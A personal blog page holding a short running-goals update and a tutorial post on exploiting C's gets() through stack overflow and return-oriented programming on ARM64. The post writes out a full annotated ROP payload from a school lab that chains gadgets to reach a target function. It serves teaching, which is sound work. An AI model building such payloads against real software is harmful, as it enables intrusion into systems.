---
layout: page
title: Blog 
permalink: /blog/
---

# First Running Milestone Achieved
 
<text style="color : gray">February 8, 2024</text>

First fitness goal of 2024 achieved: Sub-25-minute 5KM run. 

Also didn't write these earlier but here are my running-related goals for 2024: 

1. Sub-25min 5K 
2. Sub-50min 10K
3. Sub 2hr half-marathon (21.1k)
4. Sub 4hr marathon (42.2k)

<br>
<br>

# Hacking the stack using code injection and ROP 

<text style="color : gray">February 2, 2024</text>

Using C's `gets()` function can have serious cybersecurity risks.

Say a function asks for a 16-byte string argument from a user: 

```c
int main() { 
    char buf[16];
    gets(buf);
    return 0;
}
```

Then, upon calling `gets(buf)`, the stack will look something like
```
higher addr's

|      stack contents     |
|-------------------------|
|      stack contents     |
|-------------------------|
|      stack contents     |
|-------------------------|
|      buf bytes 0-7      |
|-------------------------|
|      buf bytes 8-15     |
--------------------------- < top of stack
```

The issue with this is that `gets()` will keep reading and copying input from the input past 16 bytes allocated for `buf`.

What happens then? 

Lets use the following input bytes as an example: 

```
ff ff ff ff ff ff ff ff 
ff ff ff ff ff ff ff ff 
12 34 56
```

Then, the stack might look a bit like: 

```
|      stack contents     |
|-------------------------|
|      stack contents     |
|-------------------------|
| 12 34 56 k contents     |
|-------------------------|
| ff ff ff ff ff ff ff ff |
|-------------------------|
| ff ff ff ff ff ff ff ff |
--------------------------- < top of stack
```

Even though we have filled buf, the program keeps loading in bytes 
onto the stack until a terminating character is entered. Anything that was previously stored on the stack can get overwritten.

What's stored on the stack? 

Link Registers (saved addresses to return to after a subroutine)!

This means that when we are inside a subroutine, somewhere on the stack there is a return address saved to jump back to once we exit the current subroutine.

Thus, we can overwrite the address on the stack using `gets(buf)` and a carefully crafted user input. One example I had from a school assignment:

```
11 11 11 11 11 11 11 11 
11 11 11 11 11 11 11 11 
11 11 11 11 11 11 11 11 
11 11 11 11 11 11 11 11 
11 11 11 11 11 11 11 11 
11 11 11 11 11 11 11 11 
11 11 11 11 11 11 11 11 
11 11 11 11 11 11 11 11 
11 11 11 11 11 11 11 11 
54 3e 45 00 00 00 00 00 // 0x453e54, address of gadget 1 (load x1) to load in read_file lr
11 11 11 11 11 11 11 11
11 11 11 11 11 11 11 11
11 11 11 11 11 11 11 11
11 11 11 11 11 11 11 11
11 11 11 11 11 11 11 11
80 9a 44 00 00 00 00 00 // 0x449a80, address of gadget 2 to load x0, placed in lr during gadget 1
11 11 11 11 11 11 11 11
11 11 11 11 11 11 11 11
11 11 11 11 11 11 11 11
90 ca f0 ff ff ff 00 00 // 0xfffffff0ca90, value of x1 (addr of ph33rm3n00bz)
11 11 11 11 11 11 11 11
e8 07 40 00 00 00 00 00 // 0x4007e8, addr of pwn3
11 11 11 11 11 11 11 11
11 11 11 11 11 11 11 11
11 11 11 11 11 11 11 11
11 11 11 11 11 11 11 11
11 11 11 11 11 11 11 11
11 11 11 11 11 11 11 11
11 11 11 11 11 11 11 11
11 11 11 11 11 11 11 11
11 11 11 11 11 11 11 11
11 11 11 11 11 11 11 11
3c 00 00 00 00 00 00 00  // 60, value to put in x0 in gadget 2
11 11 11 11 11 11 11 11
11 11 11 11 11 11 11 11
11 11 11 11 11 11 11 11
11 11 11 11 11 11 11 11
11 11 11 11 11 11 11 11
70 68 33 33 72 6d 33 6e // ph33rm3n00bz, value to put in x1, placed near value of $sp when reaching pwn3 
30 30 62 7a 00 00 00 00 
``` 
The above input was used to overwrite 3 link registers, overwrite 2 registers, and jump 3 different points in the code: 
1. Load the register x1 with a pointer that points to a space in memory that holds a string argument (at the end of the user-inputted data above). Since this will go into `x1`, this will be the second argument passed into any the function according to ARM64 assembly's call convention.
2. Load a value into `x0`. I had to find a [gadget](https://en.wikipedia.org/wiki/Return-oriented_programming) that wrote a value at a stack offset into `x0`, and then place the value on the stack in that special spot, all without modifying `x1` in the process, as that stored our string argument. 
3. Jump to a gadget that saves a text file with the contents of the first two variables. In a real hacking situation, the end goal would be to open a terminal to gain full access to the device, which may involve a `syscall` call. This was a harmless exercise, so it just saves a text file and we are satisfied.
